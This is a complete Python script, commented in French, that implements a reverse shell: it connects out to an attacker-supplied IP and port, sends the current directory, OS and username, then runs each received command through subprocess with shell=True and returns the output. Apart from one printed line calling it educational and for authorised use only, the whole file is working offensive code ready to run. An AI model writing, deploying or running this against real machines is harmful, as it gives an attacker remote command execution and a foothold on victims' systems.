#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import socket
import subprocess
import os
import sys
import threading
import time

class ReverseShell:
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.socket = None
    
    def connect(self):
        """Établit la connexion avec l'attaquant"""
        try:
            print(f"[INFO] Tentative de connexion vers {self.target_ip}:{self.target_port}")
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.target_ip, self.target_port))
            print(f"[SUCCESS] Connexion établie avec {self.target_ip}:{self.target_port}")
            return True
        except Exception as e:
            print(f"[ERROR] Échec de la connexion: {e}")
            return False
    
    def execute_command(self, command):
        """Exécute une commande et retourne le résultat"""
        try:
            if command.lower() in ['exit', 'quit']:
                return None
            
            # Gestion des commandes de changement de directory
            if command.startswith('cd '):
                try:
                    os.chdir(command[3:])
                    return f"Répertoire changé vers: {os.getcwd()}\n"
                except Exception as e:
                    return f"Erreur cd: {str(e)}\n"
            
            # Exécution de la commande
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            output = result.stdout + result.stderr
            if not output:
                output = "Commande exécutée (pas de sortie)\n"
            
            return output
            
        except subprocess.TimeoutExpired:
            return "Erreur: Timeout de la commande\n"
        except Exception as e:
            return f"Erreur d'exécution: {str(e)}\n"
    
    def shell_loop(self):
        """Boucle principale du shell"""
        try:
            # Envoie des informations système
            info = f"Connexion établie depuis: {os.getcwd()}\n"
            info += f"Système: {os.name}\n"
            info += f"Utilisateur: {os.getenv('USER', 'N/A')}\n"
            self.socket.send(info.encode())
            
            while True:
                # Envoi du prompt
                prompt = f"{os.getcwd()}$ "
                self.socket.send(prompt.encode())
                
                # Réception de la commande
                command = self.socket.recv(1024).decode().strip()
                
                if not command:
                    break
                
                # Exécution de la commande
                result = self.execute_command(command)
                if result is None:  # Commande exit
                    break
                
                # Envoi du résultat
                self.socket.send(result.encode())
                
        except Exception as e:
            print(f"[ERROR] Erreur dans la boucle shell: {e}")
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Nettoie les ressources"""
        if self.socket:
            self.socket.close()
        print("[INFO] Connexion fermée")

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 reverse_shell_python.py <IP_ATTACKER> <PORT>")
        print("Exemple: python3 reverse_shell_python.py 192.168.1.100 4444")
        sys.exit(1)
    
    print("[WARN] Script éducatif - Utilisez uniquement dans un environnement autorisé")
    
    target_ip = sys.argv[1]
    try:
        target_port = int(sys.argv[2])
    except ValueError:
        print("[ERROR] Le port doit être un nombre")
        sys.exit(1)
    
    # Création et lancement du reverse shell
    shell = ReverseShell(target_ip, target_port)
    
    if shell.connect():
        shell.shell_loop()

if __name__ == "__main__":
    main()